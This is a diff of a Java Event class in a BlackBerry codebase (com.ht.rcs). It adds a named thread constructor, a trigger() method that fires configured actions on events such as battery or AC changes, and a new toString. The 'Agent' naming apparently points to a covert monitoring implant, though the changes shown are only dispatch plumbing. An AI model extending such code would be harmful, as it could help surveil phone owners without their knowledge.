@@ -7,6 +7,8 @@
  * *************************************************/
 package com.ht.rcs.blackberry.event;
 
+import net.rim.device.api.system.Application;
+
 import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.action.Action;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -141,7 +143,7 @@ public abstract class Event extends StartStopThread {
         case EVENT_AC:
             // #debug
             debug.trace("Factory EVENT_AC");
-            event = new AcEvent(actionId, confParams);
+            event = new AcEvent(actionId, confParams);            
             break;
         case EVENT_BATTERY:
             // #debug
@@ -167,7 +169,9 @@ public abstract class Event extends StartStopThread {
      * @param actionId
      *            the action id
      */
-    protected Event(int eventType_, int actionId_) {
+    protected Event(int eventType_, int actionId_, String name) {
+        super(name);
+        
         this.statusObj = Status.getInstance();
 
         this.eventType = eventType_;
@@ -187,10 +191,10 @@ public abstract class Event extends StartStopThread {
      *            the conf params
      */
     protected Event(int eventType_, int actionId_, byte[] confParams) {
-        this(eventType_, actionId_);
+        this(eventType_, actionId_, "Agent");
         parse(confParams);
     }
-
+    
     /**
      * Parses the.
      * 
@@ -199,9 +203,16 @@ public abstract class Event extends StartStopThread {
      * @return true, if successful
      */
     protected abstract boolean parse(byte[] confParams);
-
+   
+    protected void trigger(){
+        // #debug
+        debug.trace("event: "+ this +"triggering: " + actionId);
+        statusObj.triggerAction(actionId, this);
+    }
+    
     public String toString() {
-        return "Event:" + eventType + "|" + eventId;
+        return "Event " + name +":"+ eventType + "|" + eventId;
 
     }
+ 
 }
